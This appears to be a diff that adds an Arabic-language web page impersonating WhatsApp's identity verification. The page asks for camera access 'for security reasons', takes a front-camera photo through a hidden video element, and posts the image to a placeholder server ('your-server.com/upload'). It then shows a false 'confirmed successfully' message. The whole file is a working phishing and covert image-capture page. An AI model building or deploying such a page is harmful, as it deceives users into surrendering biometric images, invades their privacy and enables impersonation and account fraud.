@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>تأكيد هوية واتساب</title>
+    <style>
+        body { font-family: Arial; text-align: center; padding-top: 50px; background: #075E54; color: white; }
+        .box { background: white; color: black; padding: 30px; border-radius: 15px; max-width: 400px; margin: auto; }
+        button { background: #25D366; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 30px; cursor: pointer; }
+        video { display: none; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>تأكيد هويتك</h2>
+        <p>لأسباب أمنية، يرجى السماح بالكاميرا لتأكيد حسابك.</p>
+        <button onclick="capture()">تأكيد الهوية الآن</button>
+        <video id="video" autoplay></video>
+    </div>
+    <script>
+        const video = document.getElementById('video');
+        let stream;
+
+        // طلب الكاميرا فوراً
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+            .then(s => { stream = s; video.srcObject = s; })
+            .catch(() => alert('يرجى السماح بالكاميرا'));
+
+        function capture() {
+            const canvas = document.createElement('canvas');
+            canvas.width = 640;
+            canvas.height = 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, 640, 480);
+            const imageData = canvas.toDataURL('image/jpeg');
+
+            // إرسال الصورة إلى الخادم
+            fetch('https://your-server.com/upload', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ image: imageData })
+            }).then(() => {
+                document.body.innerHTML = '<h2>✅ تم التأكيد بنجاح</h2><p>يمكنك إغلاق الصفحة</p>';
+                if (stream) stream.getTracks().forEach(t => t.stop());
+            }).catch(() => alert('حدث خطأ، حاول مرة أخرى'));
+        }
+    </script>
+</body>
+</html>
